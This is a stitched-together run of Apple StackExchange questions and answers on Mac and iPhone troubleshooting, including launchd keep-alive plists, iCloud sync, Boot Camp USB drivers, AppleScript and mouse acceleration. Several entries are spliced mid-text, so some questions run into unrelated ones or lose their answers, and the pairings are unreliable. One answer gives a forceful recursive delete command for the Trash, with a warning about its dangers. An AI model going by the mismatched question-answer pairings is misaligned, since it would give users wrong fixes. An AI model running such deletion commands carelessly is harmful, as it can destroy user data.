I'm nervous, however, that OneDrive will stop again and we'll be back in the same boat, and I don't feel that asking her to keep an eye on it is a long term or a reliable solution.  \nWhat I was thinking of doing was to write a script that monitors for the OneDrive process and will fire an alert of some kind if it's not running. I am not a Mac expert however so I'm at a bit of a loss as how best to achieve that. \nI guess AppleScript and a cron job is my best option. Can anyone advise if there is a better method, and can anyone help me getting started with AppleScript to detect a process and send an email warning if it's not detected?\nEDIT : Process name is OneDrive\n\nA: IMO your best bet would be to use launchd to make sure that OneDrive is always running no matter what.\n(launchd is a bit like cron but much more powerful.)\nSave this file as ~/Library/LaunchAgents/com.tjluoma.keep-onedrive-alive.plist (where ~ is the home directory on the secretary's computer):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>KeepAlive</key>\n    <true/>\n    <key>Label</key>\n    <string>com.tjluoma.keep-onedrive-alive</string>\n    <key>Program</key>\n    <string>/Applications/OneDrive.app/Contents/MacOS/OneDrive</string>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\n\nThen load it in launchd using this command:\nlaunchctl load ~/Library/LaunchAgents/com.tjluoma.keep-onedrive-alive.plist\n\nThat will:\na) Launch OneDrive\nb) Re-Launch OneDrive if it is quit or crashes. Basically anytime it stops running, it will automatically start again.\nNote that you should UN-check the option in OneDrive's preferences to open at login, because launchd will be in charge of running it.\n\n", "Q: 12V - 0,67 A USB Wall Charger for iPod Classic I have a vintage iPod Classic 2004:\n\nI want charge it with my 10W iPad Pro charger and an USB A -> 30-pin old Apple cable. However, it not charged and started to showing Apple logo in a loop. It ran after connecting it to Mac with USB, so device is working. After looking the details on old brick charger, it is a 12 V and 0,67 A charger. Now, I'm searching a USB charger with these properties.Any suggestions? Thank you.\n\nA: There is no USB charger other than USB-C that will supply more than 5V DC. \nUSB-C (3.1 spec) provides for power delivery and will negotiate up to 20 V. However, the iPod Classic is not USB 3.1 compliant, so it will not negotiate with those chargers.  \nYou need the original Apple charger designed for that device. \n", "Q: AppleScript application as a Safari Webpage I currently using an AppleScript application that launches a website (phpMyAdmin) in Safari.

I'm using macOS High Sierra (10.13.6) on a MacBook Pro 15. In the Keyboard Preferences pane, I have \"Show keyboard and emoji viewers in menu bar\" option in the \"Keyboard\" tab turned on:\n\nSure enough, as desired, there's a menubar icon that, when clicked shows these in a menu:\n\nHere's the strange thing: sometimes that icon is the \"window with command key icon\" icon:\n\nand sometimes it's a US flag:\n\nWhen it's a flag, clicking it turns it back to the \"window with command key icon\" icon, and shows the previous menu.\nMy guess is that this is triggered by my having the \"Show Input menu in menu bar\" option in the Keyboard Preferences' \"Input Sources\" tab turned on:\n\nIf I turn \"Show keyboard\" off and leave \"Show Input menu\" on, then the icon stays a US Flag, and reliably shows an input menu:\n\nSo: any idea why these two menus can't coexist, and that the \"Show viewers\" option (mostly) overrides the \"Input sources\" optoin? Is this a macOS bug?\n\nA: I don't know exactly when Apple changed the behaviour of the icon in the menu bar\n(somewhere between Yosemite and High Sierra?).\nTo recover a flag always telling you which is the keyboard in use, here is my workaround:\nIn:\nSystem Preferences > Keyboard > Input Sources\n\nadd another keyboard mapping with the lower left + button.\n", "Q: Spell check for macOS Terminal app?

You can also grep /usr/share/dict/words. Even, curl with the dict protocol using the match key could be useful for spelling. Both emacs and vim have spellcheck features.\n\nA: A couple spell check tools available for macOS via Homebrew are listed below.

My Mac has iCloud Drive enabled.\nMy understanding is that this should cause it to be uploaded to iCloud Drive, and thus available on iCloud.com. However, when I log in to iCloud.com, there is no PDF available in iCloud Drive.\nToday I also enabled iCloud for iBooks on my iPhone. The PDF is not available there either.\n(In iTunes on my Mac, I still have the iPhone set to sync books with my Mac. I was planning to turn this off once I confirmed that iCloud Drive was working. But I don't think that matters here. Bonus points if you can provide any advice on the impact of changing that setting, though I'm pretty sure it should be obsolete once everything is using iCloud.)\nDo I have to wait some undetermined amount of time for this to propagate? Any way to make it manually sync so I can confirm it is working?\n\nA: Well, it turns out the answer was rather simple. I had iCloud enabled on my Mac, but it was not specifically enabled for iBooks. (Perhaps it was initially disabled because it is a new feature in recent versions of Mac OS).\nI went to System Preferences -> iCloud -> iCloud Drive (click on Options...) -> click the check box next to iBooks to enable it.\nAfter doing this, I immediately saw my PDF in iBooks on my iPhone (the one that I had added to iBooks on my Mac). I did not see the PDF within the iCloud Drive folder on iCloud.com, but I guess I can treat that as a separate issue since at least I've confirmed the sync worked.\n\nA: I had the same problem as you and many others. Now, I have solved it simply by having Books and System Preferences opened AT THE SAME TIME on my Mac, then I went into System Preferences/iCloud/iCloud Drive options and toggle Books on->off->on.\nWhile toggling, I can see the books in Books app disappearing and reappearing. Then those books started appearing on my iPhone Books app as well.\n", "Q: External Windows bootable drive freezes boot screen I installed Windows on a 128 GB USB drive to run on my 2017 MacBook Air. I boot into it by plugging in the drive, holding Option key and select the Windows drive. It worked really well.\nYesterday, I booted up in to Windows as usual, everything went well, and suddenly, everything froze. I got a Blue Screen Of Death saying stopcode BUGCODE USB3 DRIVER. And as it told me to do, I restarted my Mac.\nBut now, if I start up and hold the Option key the Windows drive won't appear. And if I plug it in after I hold the Option key, the entire screen freezes for about 30 seconds and then the USB is ejected again. \nI am still able to use my other USB to boot up in to Linux but if I boot into macOS, it doesn't even detect the Windows Flash drive. Windows (on another pc) seems to detect it but ejects the flash drive after 10 seconds. And I really don't know what to do.\nThe Flash drive does the same on other Macs.\nHow do I resolve the issue?\n\nA: *\n\n*After the BSOD your mac should restart to \"Start Windows Normally\" screen hit Enter To Start Windows Normally\n\n*Go to device manager (Press Start and type devmgmt.msc and hit enter) and uninstall \"unknown device\" under \"Universal Serial Bus Controllers\" Tick \"Delete the Driver Software for this device.\"\n\n*Now go to your Bootcamp folder i.e. BOOTCAMP_5.1.5621 or BOOTCAMP_5.1.5640 and go to Bootcamp > Drivers > Intel\n\n*Now run the file IntelxHCISetup.exe. It will show you the intel usb3.0 setup assistant. do not install or cancel the setup as it will delete the temporary folder in temp\n\n*Now go to Start and type taskmgr.exe and hit enter. It will open up Task Manager.\n\n*In that you have to select Intel Installation Framework and type Shift + fn + f10 to open right click menu (Right click may not work  unless you finish installing bootcamp fully).\n\n*Select \"Go To Process\", and again press the Shift + fn + f10 key combination to bring up the right click menu\n\n*And then select Open File Location, Now copy the contents of the folder to a new location i.e. by creating a new folder in the desktop or any other location\n\n*After copying the contents of the folder to a new location go to Device manager and right click the Unknown Device and press the Right click key combination Shift + fn + f10 and select Update Driver Software > Browse my computer for driver software and browse for the folder that you created in Step 8 and click next. It will detect the driver and installs it automatically.\n\n\nThat should solve your problem with the USB Drive.\n\nA: I was having the same problem booting Windows 10 created by WinToUSB to run Windows on my MacBook Air. After I selected to create a MBR Partition on the USB drive instead of GPT, the installation went fine and so far I'm running it with no problem.\n", "Q: Apple mail matching signatures with account aliases possible? I use a gmail account with apple mail. It's very annoying that I have to pick a matching signature everytime I decided to change the from email alias.\nIs there anything I can do that will allow me to match up a signature with each alias email address?\n\nA: For this kind of professionnal use of E-mail, I abandonned Gmail and Mail many years ago.\nI use Thunderbird ( Thunderbird home page ) which is much more secure, lets you configure it exactly the way you are looking for through the concept of \"identities\". You can define many \"identities\" per account, each one being defined by:\n\n\n*\n\n*a name\n\n*a \"From:\" field\n\n*a \"Reply-To:\" field\n\n*an \"Organization:\" field\n\n*a signature (in HTML or text)\n\n\nI use this E-mail client as a much faster interface to Gmail letting me answer with the identity required and permitting my correspondant to answer me with my appropriate reply address.\n\nAs a collateral advantage, you will most probably discover many other advanced function to use in Thunderbird.\n", "Q: Clear \"Other Volumes\" storage in Disk Utility I have around 7 GB of stuff labeled under Other Volumes in my disk. What is using the storage reported under Other Volumes in Disk Utility and how to remove it?\nI am running macOS High Sierra.\n\nA: No, you can't remove it.\nAlong with the startup volume on which the macOS is installed, there are additional volumes which are created and used by your Mac. These other volume(s) are hidden and some of them are not even mounted.\nTo list the volumes, run:\ndiskutil list\nThe occupied storage space of all such hidden volumes is aggregated and reported under Other Volumes in Disk Utility.\n", "Q: Bluetooth icon keeps randomly disappearing from menu bar in High Sierra From some unknown reason, the bluetooth icon keeps disappearing from the menu bar at random. I have to open up settings and activate \"Show bluetooth in Menu Bar\" regularly. Why does this happen and how can I stop it from disappearing?\n\nA: Using inductive logic, and under the assumption that you didn't \"un-tick\" the box, then it must be software. My best guess would be software associated with a device that uses Bluetooth. One way to check that is:\nHold down shiftoption while clicking the BT icon in your menu bar. You should see all the usual options, plus one called Debug. From here, things get version dependent, but you should at least have a Debug option giving you more options to reset the Mac's BT module, or any connected Apple BT devices. Some earlier versions of mac os, prior to 10.13.6, are reported to also have a \"BT log\" option. \nAnd so this might be the first stop, reset devices one at a time in a process-of-elimination mode. \nIf you're more conversant with BT, Apple has some tools that might help pinpoint an errant device causing the \"un-tick\". One of these tools is referenced frequently, and called Bluetooth Explorer.app (download). It's part of Apple's developer's toolkit. Another tool available in the same download is PacketLogger.app. Bluetooth Explorer.app would start on my system (10.13.6), but refused to display the GUI, making it useless. But apparently it does run on some systems, so YMMV. However the PacketLogger.app started without drama. It has features that may help find a particular message or message type - if you know what to look for :) \nYeah, I agree, fairly remote possibility that a BT device is the cause, and that these apps will pinpoint it, but if all else fails... \n\nA: It sounds like a software issue. \nI would reset the NVRAM/PRAM and then see if this prevents the symbol from disappearing.\nShut down your Mac, then turn it on and immediately press and hold these four keys together: Option, Command, P, and R. You can release the keys after about 20 seconds, during which your Mac might appear to restart. You might hear a startup sound.\nIf your Mac plays a startup sound and you hear it twice, let go.\nIf your Mac doesn't play a sound but you see the Apple logo, then let go.\nIt should bring your Mac back to the login screen. \nIf so login and then keep your eyes on it to see if it continues.\n\nNVRAM (nonvolatile random-access memory) is a small amount of memory\n  that your Mac uses to store certain settings and access them quickly.\n  PRAM (Parameter RAM) stores similar information, and the steps for\n  resetting NVRAM and PRAM are the same.\nSettings that can be stored in NVRAM include sound volume, display\n  resolution, startup-disk selection, time zone, and recent kernel panic\n  information. The settings stored in NVRAM depend on your Mac and the\n  devices that you're using with your Mac.\n\n", "Q: Prevent text messages from being sent to recipient's email address Recently when I sent a message to an iPhone recipient, it was sent via SMS, presumably because one of us couldn't connect to iMessage. However, the strange thing is that my iPhone sent the text message to the recipient's email address, instead of their phone number:\n\n(I was surprised to see this actually worked because Verizon evidently relays SMS-to-email from yourphonenumber@vzwpix.com, and when the recipient responds, it gets relayed back via SMS.)\nThe phone number and email address are in the correct fields in their Contacts card, but Messages chooses the email address instead of the phone number for Text Message:\n\nI checked other contacts, and all of them have a phone number in the Text Message field in Messages, but a few have two Text Message fields, one with a phone number and one with an email address. This is the first time I have seen Messages send via email. Does anyone know of a fix?\n\nA: The sender needs to attach their number to their iMessage \"Send & Receive\" list.\nOn the iPhone they can go to Settings -> Messages -> Send And Receive -> Add iPhone phone number along with their Apple ID email.\nThen make sure the phone number has a check mark next to it.\nThen try texting them again and see if it emails them the message, it shouldn't.\n\nA: I don’t think messages is doing any email sending, the address you see is the AppleID address. This is how iMessage works on devices without phone numbers (Macs, iPads)\nAt the same time, messages and iMessage have no way of knowing what a telco does after a SMS is sent, so even if that SMS-email relaying is happening, imessage/messages has no way of knowing about it, or influencing it.\n\nA: You could remove the email address from your contacts, or you could just wait until the message gets sent.\n", "Q: Backing up the iCloud Photo Library when it won't fit on my internal drive I love the iCloud Photo Library. Formerly an Aperture user, I enjoy having my entire library available on every device and now use it as my master repository. I upload raw files into it, taken from my DSLR, and of course the photos my iPhone takes. It's great. None of the devices I have, carry sufficient storage to download the entire library and so I have them all set to 'optimize'. Which is fine for day to day use, and even while editing as it downloads when needed. But I keep reading horror stories about libraries getting wiped out through bugs in Apple's software, and just generally speaking am getting increasingly worried I have just 1 copy of my entire library: the copy in iCloud. \nSo, I want to back up my library. But my drive is too small to make a copy of the library onto it. So, how?\n\"Attach an external drive\" ... I tried doing this. And while I can store the library on the external drive, this then means I no longer have ANY photos on my laptop when I'm not at my desk.\n\"Create a second library with different sync settings\" ... It's not possible to have 2 different libraries both sync down from iCloud, it turns out. \nWhat other options do I have?\n\nA: Can you set your library to be on the external drive, turn on the setting to keep originals locally, then download everything.\nThen take a copy of that library on the external drive, turn off the setting to download originals locally, and move the library back to the internal drive?\nI can't see why that would not work ...\n\nA: A possibility could be to have two users on the computer, and having one of them setup with the library on the external disk and enabling \"Download originals to this Mac\", and having your main user with the library locally and the previously mentioned setting disabled.\nThat way you would only sync your photos to the external drive when logged in to the second user.\nTake a couple clicks to do the \"backup\", but it would work.\n\nA: There is an option to make sure that your Mac has download originals selected (if it can bear the space) and then once all of the iCloud Photos have been downloaded to the Mac, you can go to File -> Export All and then make a folder on your external hard drive and then you will be able to save the photos to your external drive directly.\nIf you need step by step directions let me know.\n", "Q: How full is my iPhone voicemail box? I want to be able to know how full my voicemail box is before it starts rejecting caller's messages. Is there a command that does this?\n\nA: Depending on what carrier you have you can try the following:\n\n\n*\n\n*If you have visual voice mail you should be warned when you are at or near the limit in Phone > Voicemail\n\n*Try calling your own number. Most carriers use that to access your voicemail. If it asks for a password, it will most likely default to the last 4 digits of your phone number. Once connected it will most likely tell you if your voice mail is full. You can also delete messages from there. \n\n*If the above option does not work, call your carrier and ask how to access your voicemail.\n\n*If all else fails you call from a different phone (house phone or friend) and test it out. You could also use a spoofing service and call your own number. \n\n", "Q: How do I retrieve photos from the cloud after I place them there? I recently uploaded photos from my iPad to iCloud.  Then deleted them from my iPad.  How do I retrieve selected ones and load them back onto my iPad?\n\nA: Both iCloud Photo Library and iCloud Photo Stream are synchronisation services, and will do exactly that. Sync between devices.\nMeaning that if you delete your photos from your iPad manually, they will also be deleted in the iCloud Photo Library unless you disabled this feature first.\nYour best shot at retrieving your images is to check your \"Recently deleted\" folder on the iPad or after logging in to https://www.icloud.com under Photos.\n\nA: You can load them on your Mac (Photos app) / PC (iCloud for Windows) via iCloud Photo Library and then select the ones you want, copy to a folder and then upload them to the phone.\n\nA: If you are using iCloud Photo Library to sync all your stuff across devices, once you delete your photo from your iPad, it will be deleted across all devices AFAIK. \nUnless you mean something else by \"upload\" as in manually.\n", "Q: Display arrangement keeps changing My iMac keeps changing the arrangement of my two add-on displays.

I'm curious what does having a ThunderBolt display over others mean?\n\nA: A) A cable cannot \"increase\" the resolution of one source to a destination. However, if the cable provided more bandwidth than your previous cable, the system would seem to upgrade the speed because of the extra bandwidth available.\nThink of it in terms of a highway with cars. If your old cable is only a two-lane highway, you can only put a certain amount of cars on it. Now if your new cable is an 8-lane expressway, then you can put so many more cars on it and even though the speed of the cars does not necessarily increase, there are more cars and more bandwidth and less traffic.\nB) As for the LG Electronics 34UM88-P, it supports thunderbolt 2.0 as well as DisplayPort - both of these are supported on the Mac Mini.\nSource: https://www.lg.com/us/monitors/lg-34UM88-P-ultrawide-monitor\n\nA: An appropriate cable will allow a monitor to achieve its max resolution but it will not change or increase the max resolution of the monitor - that is down to the design of the monitor.\n", "Q: Wirelessly debug Safari web app running on iOS using Safari on macOS I need to plug an iPad/iPhone into a Mac Mini so I can debug web pages running ApplePay on them using the macOS Safari developer console.\nComplication: The Mac mini is in a server cupboard three rooms away (considerably further away than the hard USB 5 metre limit).

I tried hard reset and reset NVRAM (which got the device to show login screen). As I log in, the screen gets progressively more corrupted - see screenshot.  Then, the Mac turns off shortly after.\nIf I buy a new device I would still have to pay for data recovery and transfer service, as the old device is non functional?\n\n\nA: You have several options to fix this issue:\n\n\n*\n\n*Have the board professionally repaired.  This is a common repair that can be done, but it's not economically feasible because the cost of the labor is very high in comparison to what you can get a new MacBook Air for\n\n*Swap out the logic board for a known working one (available on eBay for less than $200USD).  This may be a viable option, but keep in mind, your MBA is 8+ years old.  You will be expending money to get another 8 year old machine.  \n\n*Buy a new machine and transfer your data using an external enclosure.  The 2011 MBAs had a removable SSD that you could remove and put into a replacement machine or you could put it into a USB enclosure so you can extract your data.  \n\n\nPersonally, I would buy a new MacBook, MacBook Air/Pro.  I would remove the SSD from the dead machine, put it into an enclosure to extract the data and then sell the 2011 MBA as salvage parts.\n\nIf I buy a new device I would still have to pay for data recovery and\n  transfer service, as the old device is non functional\n\nThis is what Time Machine backups are for and it's extremely cheap insurance in case of a failure (see the section titled  \"A Word About Backing up Your Data\").

It also means that you can use the trackpad.\nIt can also help to use Karabiner to disable the built-in keyboard when external keyboards are plugged in. This overcomes the problem of accidentally activating the keyboard underneath when pressing firmly on the magic keyboard.\nFor details on how to do this, see this post: https://apple.stackexchange.com/a/235266/11747 That said, I'm not a big fan of virtual keyboards, as I worry that they induce lag.\n\n\nA: I'm looking for the exact same thing but I haven't really found anything. What I thought of was maybe to get a few mobile phone game controllers that you stick on the screen like this:\n\n\nBut you probably can't close your MBP with those buttons attached so you'd need to remove them/set them up all the time. I do wish someone makes a control strip version of that.\nPS\nHere's a link to the game controller: https://www.amazon.com/dp/B00AROMN8G\n\nA: This might be a not so useful answer, but why do you want that instead of just clicking the touch bar?\nIf it's because of the extremely not-useful layout, I've found that BetterTouchTool resolves that task pretty nicely\n", "Q: Cannot ping a single website when I am logged into my account I am having an issue connecting to my website.

This is also true for any CLI command like curl or wget and most apps (some apps don't appear to honor /etc/hosts.)\nNote that the host name specified in the command must match an entry in /etc/hosts exactly, for example:\n192.168.16.3   myserver.mydomain.com\n\nwill direct ping myserver.mydomain.com to try to reach 192.168.16.3, but ping myserver will query DNS with whatever default domain is configured in /etc/resolv.conf.\nFor more information on /etc/hosts, see man hosts and this Wikipedia article on /etc/hosts.

I am using this MacBook for 3 years.\nWhat ideas should I consider next?\n\nA: It looks like you have sufficient Disk space and RAM.\nIf your battery is EOL (died) or not holding charge... \nMac will cut the CPU clock speed to 1/2 of maximum that will impact all and any operations.\nInstall Intel Power gadget to verify your CPU, this is an example of normal speed CPU.\n\nUse the Activity Monitor to see who is responsible. Here are my examples.\n\n\n\nNotice the Disk activity as Data/Sec\nFinally about the battery (check this on your computer)\n\n\nA: While you have 24GB left for storage on your Mac, it might still be causing it to slow down... I would recommend trying to clean it up and remove any files or apps that you no longer need. If you have things like images taking up a lot of room, it may be time to try something like storing them online, that way if something ever happens to your Mac, they will still be safe. \nThe true test would be to back up all your files and apps to Time Machine and then erase the storage and install a clean OS. You could then be sure the storage and speed are perfect before adding your files back or know if you get it repaired, the speed will be fixed before you add your apps.\nThe free space would be a concern if you had a traditional HDD - but with SSD, they have spare capacity and don’t slow down as they fill until you are really close to 2 GB free in my experience.\n", "Q: How to do I tell Quicktime player to start a New Movie Recording with a apple script? I have made a duplicate of the application \"Quicktime player\" on my Mac and renamed it \"Reaction\" then I have put this copy inside of a applescript. I am trying to write a code that tells the \"Reaction\" to start a \"New Movie Recording\" (which is a option of recording) then save the recording within the applescript. (the name of the recording is irrelevant)\nExtra: Also if anyone knows how I could then code a way to add the recording to a email and send it to people that would be great.\nAt the moment I know how to open \"Reaction\" but not how to tell \"Reaction\" to start a \"New Movie Recording\"\nSo far i'm using this to open \"Reaction\"\n  set appPath1 to path to resource \"Reaction.app\"\ntell application \"Finder\"\n\n\nopen appPath1\n\nend tell\n\n\nA: Having duplicated your QuickTime Player application and named it Reaction, I understand you've created an AppleScript applet, and placed this copy of Reaction.app within the Resources folder of the AppleScript applet.\nBecause it's a duplicate of QuickTime Player (which is scriptable), Reaction is also scriptable, and can also be scripted from within the applet's AppleScript (located at Resources/scripts/main.scpt).\nYour main.scpt should look something like this:\nset A to path to resource \"Reaction.app\"\n\nset home to POSIX path of (path to home folder)\nset fp to home & \"/Movies/Reaction Recording.mov\"\nset f to a reference to POSIX file fp\n\nusing terms from application \"QuickTime Player\"\n    tell the application named A\n        activate\n        tell the (new movie recording)\n            start\n            delay 10\n            pause\n            save in f\n            stop\n            close\n        end tell\n    end tell\nend using terms from\n\napplication \"QuickTime Player\" may change of its own accord to application \"Reaction\", which is completely fine.\nThis script creates a ~10 second recording, minus a couple of seconds to account for the initialisation of the script and such.

The speakers often go from perfectly clear to very noticeably muffled when adjusting the volume. It often happens when turning the volume up - but it'll still be at reasonable levels. It gets muffled immediately as opposed to slowly degrading in quality which leads me to believe it's not a problem with the speaker slowly deteriorating.\nIt usually goes away after a few restarts.\nIs this normal? How can I debug this further?\n\nA: I've experienced this issue and after a complete re-install and every troubleshooting regarding software tried out, I handed it in at an AASP. They determined the issue to be hardware, and exchanged the top case (which also means no more sticky keys).\nSo my best advise is, take a backup and go visit your local AASP.\n\nA: I've been experiencing this problem for quite a long time, at some point it hit me that, this probably something to do with with driver, since switching frequency on midi settings fixes temporarily\nI've been using eqMac (github) a system wide equalizer which installs it's own drivers seems like solving the problem\n\n", "Q: What is the keystroke code for space bar in applescript?

I installed a module for TypeScript in VSCode for intellisense. I subsequently deleted the project, but it compiled those modules in .compile in same project and now I'm not able to delete this directory from Trash. Neither am I able put the item back to its original location.\nHow do I get rid of the item from the Trash?\n\nA: You might try running rm -fr .Trash/* from a terminal window.\nMake sure you haven't cd'd out of your home directory first. But foremost, be careful: rm -fr is a powerful and dangerous command if used wrongly. For example, if you were to add a space before the *, you'd remove all of your files, including the .Trash directory! The first is disastrous, the latter is probably not desirable.\nIt still might not succeed, due to files with flags set. In case you run into such problems, note that the -O (capital letter O) flag to ls -l will display any file flags. Run, e.g., ls -AlOR .Trash to see a listing of everything in .Trash, including their flags. Check the manual page for chflags to learn what flags exist, what they mean, and how to change them.\n\nA: I was running into a similar issue with node_modules* directories. I was able to get around it by renaming the files to something different - in my case I sed \"fake-folder\". Then I was able to delete them regularly from trash.\n", "Q: iPhone upgraded to iOS 11 - retrieve log data from an old incompatible app called \"Articles\" I mistakenly upgraded my iPhone to iOS 11.4.1, and my Wikipedia app called Articles, which I've been using for 8 years or so, is now no longer compatible.\nDoes anyone know if there is a way to retrieve or extract my search log from this app? I just want a plain-text list with all my search terms and their date.\n\nA: There are a couple possibilities.  \nYou can backup your iPhone using iTunes, and then try restoring your iPhone's backup to another iPhone that is running an older iOS version.\nYou can backup your iPhone to a Mac using iTunes with encryption turned off, and try using one of the (paid?) Mac utilities that can read unencrypted iOS backup files in the iTunes backup directory.\n\nA: Unfortunately, it won't be possible. It will no longer be possible to launch the app on your iPhone. Neither can you downgrade the iOS now.\nThe said app is 32-bit only. iOS 11 does not support launching and installing 32-bit only apps. After upgrading to iOS 11 from a previous version, any installed 32-bit stops working.\nIf the said app supports file sharing & stores it's log in accessible manner inside the app bundle, you can attempt to recover those files by connecting your iPhone to Mac/PC and retrieve the files from within iTunes.\nNote: To resume access to the app and to potentially re-gain access to your user data, it is advisable to contact the developer and request them to update the app with support for 64-bit so that the app can continue working with iOS 11 and later.\n", "Q: Set different keyboard settings for two different users or applications on Mac?

I'm doing research into MacBooks and would like to pick the one which is easiest/cheapest to repair. Can someone point me to a list which has some metrics like \"repair score\" or reliability? I know lists like these exist for iPads and some of the latest ones receive horrible grades, like 0 for repair score. I read about keyboard issues and high costs of repair for the newest 2016-17 models as well. \nWhich pre USB-C MacBooks have the highest repair score?\nIdeally I'm looking for information on how easy it is to replace faulty components, like memory or keyboard (apparently I need to replace the entire board on MacBook Air to change memory and entire upper body to replace keyboard, or send it to specialized repair shop)\nI would like to have one with traditional USB ports, as I want to use it for traveling abroad, where new USB-C? devices are still very rare, and genuine Apple stores are few and far between.  \n\nA: iFixit.com has an entire blog about repairability scores:\nLaptop Repairability Scores\n\nIt's sorted by score from highest (easiest) to lowest (most difficult) or by release date (most recent first).  It includes all makes and models, not just Apple, so if you're looking for an Apple centric list, you'll need to extract the data manually.\nIMO, this is an exercise in futility.  Why?\n\n\n*\n\n*MacBook Airs from 2012 have not only soldered in RAM, but the drives are proprietary making them expensive.  These are the only ones that currently (as of this writing) have SSDs that technically can be upgraded.\n\n*MacBook Pros from 2013 on have soldered in RAM and proprietary SSDs as well\n\n*2015 MacBook Pros are the only ones with a removable SSD and without the problematic butterfly keyboard\n\n*After 2016, you're getting the butterfly keyboard, soldered in RAM and SSD and USB-C\nSo, if you want high repairability and no USB-C, you're looking at a 2012 model which makes it 6+ years old (soon to be obsolete).  Every manufacturer is going USB-C/Thunderbolt 3 so it's much more economical to just bite the bullet and get a dongle.\n", "Q: After installing High Sierra, preferences do not stick: PhotoShop images default to open in Preview Since I \"upgraded\" to High Sierra, the text program (Tex-Edit Plus, v14.10.4) always reverts to the default preferences of opening two windows I do not want open: \"Enable Quartz anti-aliased text at startup\" and \"Enable TSM (Text Services Manager) at startup\" windows. The DOC preferences open text at 10 points, and in the Save preferences not including the .txt extension when saving files. I then must manually change the preferences since I use this program every day. Mac used to save my preferences; it apparently no longer does and does not explain how to fix this.\nAlso, I am a graphic designer and Use Adobe Photoshop all the time, and when I make a screenshot of something, or even have a .psd file in layers, High Sierra now often still reverts to opening Photoshop files in Preview. The ONLY time I use Preview is if I want to reduce the file size of a created PDF file. I Get Info for the image, and when I set the default app (it shows Preview) I use the down arrow for other apps and it doesn't even show Photoshop. I have to search for it, tell it to use Photoshop, and then to do this for all similar files. On average, about 10 minutes later it STILL opens Photoshop files I am working on in Preview again.\nThese little glitches in High Sierra make it time-consuming to do the exact same work I did before getting High Sierra. Is there any way both of these problems could be fixed so I don't spend time telling high sierra over and over again how things should work on my computer?\n\nA: You probably have a couple of issues. First, I would repair the home folder permissions. Unfortunately, not everything you’re likely to use respects your home folder permissions, and they can get messed up. First rule of thumb is that everything in the hierarchy of the home folder should be owned by the user who owns the home folder. Go to Eclectic Light downloads and get RepairHomePermissions. Perform that, then reset your launch services database. Most Mac helper tools such as Onyx provide that, but here’s a command line for Terminal that goes to the heart of it:\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -r -domain local -domain system -domain user\n\nYou’ll get new app prompts for awhile, but it should help you get your launch services under control.\nUnfortunately, we had to give up the default creator file properties in OS X some time ago, so unless the developer writes code of the sort I'm including below into the file saving process, your files open according to their name extension rather than according to what app created them. Part of your problem may be that you expect any file you create using a particular application to be opened in that application whenever you double-click that file. For that reason, you may want to enable viewing all name extensions in Finder (Finder>Preferences, then Advanced, “Show All Filename Extensions”) for awhile, until you get your defaults configured the way you want. Anyway, here’s a droplet source for AppleScript that will make Photoshop open individual files you drop on the AppleScript app you create from it. That is, it won’t change the app association for every file as you can if you use the check box in a file’s info window (which should work once your launch services are fixed). If you like, I’ll give you a longer one that provides the ability to choose between apps that you want to open the files by default.  I could also help you make a version to use in an Automator service that you could select from your contextual menu when you right-click a file or selection of files.\non open filelist\n    repeat with theitem in filelist\n        set filePath to theitem\n        set target_file to POSIX path of filePath\n        tell application \"Finder\" to set target_app to (get application file id \"com.adobe.Photoshop\" as text)\n        tell application \"System Events\"\n            set default application of file target_file to (target_app as alias)\n        end tell\n    end repeat\nend open\n\n", "Q: Minimum Image Object Size in macOS Pages 7.1?

If I check my phone's lock screen, I can see that I got a new text, I just can't get my phone to alert me. When I close the computer, however, I receive alerts just fine.\nHas anyone else experienced this? Is it normal or is there something I can do to fix it? Do Not Disturb and message forwarding are disabled.\n\nA: This is normal.  Messages notices you were sent the alert on your Mac so it doesn't alert again for the same message on your iPhone.\nYou mentioned that when you do get Messages alerts on your iPhone when your computer is locked or has the lid closed.  Messages is designed to not 'over alert' you when it believes you've already seen the alert.  \n", "Q: External microphone input volume too quiet MacBook Pro 13\" 2016 Touch Bar version\nWhenever I plug an external microphone it's really quiet, what's more changing the input volume in the Sound settings doesn't affect it at all - It's still very quiet but hearable at 0 Volume and exactly the same at full volume.\n\nIs there any way for me to increase the volume of the external microphone?\nPS. It's the same regardless of the device, all 3 different headphone pairs behaved the same\n\nA: The command to set your microphone levels all the way up is this:\nsudo osascript -e \"set volume input volume 100\"\n\nAlso check your microphones for dust in the mic hole and if there is a power source on the device you may need to plug it in. It may need the built in mic amp.\nIf that doesn't help possibly a 3rd party free app like Soundsource that gives you sliders to toggle Speaker/Microphone levels from the menu bar. I've never used it but found it referenced in the apple forums.\n\nA: I'm a bit late to the party, but I had a similar issue and found a solution that worked for me.\nThere is a product from rogueamoeba.com called 'Audio Hijack' that lets you take audio from any input (or directly from individual apps), perform processing and send it to an output or record it.  It's worth considering getting Loopback at the same time as there is a deal on getting both.  Both have free trial modes where it starts adding noise after 20 minutes or so but you can restart the apps for another 20 mins testing.\nThere is a 'Built-In Effects' block called 'Volume' that allows you to alter the volume and it has 'Overdrive' options to increase the volume by up to four times. Seems to work well for my Aftershokz OpenComm headset that's too quiet for me even at 100%.\nIf the volume from the mic is really low though, it might be expecting to be powered by what it's connected to, so it might be worth considering a preamp or an alternative mic that outputs at line level.\nI hope this helps.\n", "Q: What is QuickTime \"unknown error (-50)\"?

The obvious answer you can find everywhere is:\ndefaults write .GlobalPreferences com.apple.mouse.scaling -1\nwhich disables mouse acceleration, but locks you at one sensitivity. \nOld solutions:\nSmoothMouse no longer works. Mouse Acceleration Preferences Pane and SteelSeries ExactMouse both behave the same as com.apple.mouse.scaling -1 at all tracking speed settings (but without restart required).\nIs it possible to disable mouse acceleration while still being able to adjust the sensitivity?\n\nA: Under Big Sur, defaults write .GlobalPreferences com.apple.mouse.scaling -1 still works but requires a restart. However once restarted and my MacBook Pro goes into sleep mode and comes out of it, the mouse acceleration is back again. It requires a full restart after each time it goes into sleep mode.\n\nA: The built-in options are limited. To achieve your goal a combination of different software could be needed.\nSensitivity and mouse acceleration\nTerminal\nLike you have already mentioned, the following setting needs to be applied to disable mouse acceleration.\ndefaults write .GlobalPreferences com.apple.mouse.scaling -1\n\nIt can be a good idea to establish a script to automatically perform this action during login to ensure it is properly applied.\nAlternatively, mouse acceleration can be configured using SteerMouse (presented 